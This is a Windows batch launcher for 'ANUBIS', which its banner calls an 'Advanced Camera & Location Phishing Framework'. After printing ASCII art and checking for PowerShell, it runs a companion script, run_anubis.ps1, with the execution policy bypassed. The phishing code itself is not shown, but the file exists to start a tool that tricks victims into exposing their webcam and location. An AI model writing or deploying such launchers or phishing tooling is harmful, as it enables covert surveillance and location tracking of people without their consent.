@echo off
title ANUBIS v2.1
color 0b
chcp 65001 >nul
:: ANUBIS Quick Launcher for Windows
:: Double-click this file to run ANUBIS

echo.
echo         ▄▄▄       ███▄    █  █    ██  ▄▄▄▄    ██▓  ██████ 
echo        ▒████▄     ██ ▀█   █  ██  ▓██▒▓█████▄ ▓██▒▒██    ▒ 
echo        ▒██  ▀█▄  ▓██  ▀█ ██▒▓██  ▒██░▒██▒ ▄██▒██▒░ ▓██▄   
echo        ░██▄▄▄▄██ ▓██▒  ▐▌██▒▓▓█  ░██░▒██░█▀  ░██░  ▒   ██▒
echo         ▓█   ▓██▒▒██░   ▓██░▒▒█████▓ ░▓█  ▀█▓░██░▒██████▒▒
echo         ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░▒▓███▀▒░▓  ▒ ▒▓▒ ▒ ░
echo          ▒   ▒▒ ░░ ░░   ░ ▒░░░▒░ ░ ░ ▒░▒   ░  ▒ ░░ ░▒  ░ ░
echo          ░   ▒      ░   ░ ░  ░░░ ░ ░  ░    ░  ▒ ░░  ░  ░  
echo              ░  ░         ░    ░      ░       ░        ░  
echo                                             ░               
echo.
echo     Advanced Camera & Location Phishing Framework
echo     https://github.com/lahirusanjika/Anubis-Cam
echo.

:: Check if PowerShell is available
cd /d "%~dp0"
where powershell >nul 2>nul
if %errorlevel% neq 0 (
    echo [ERROR] PowerShell not found!
    echo Please run this on Windows 7 or later.
    pause
    exit /b 1
)

:: Run the PowerShell launcher
powershell.exe -ExecutionPolicy Bypass -File "%~dp0run_anubis.ps1"

pause
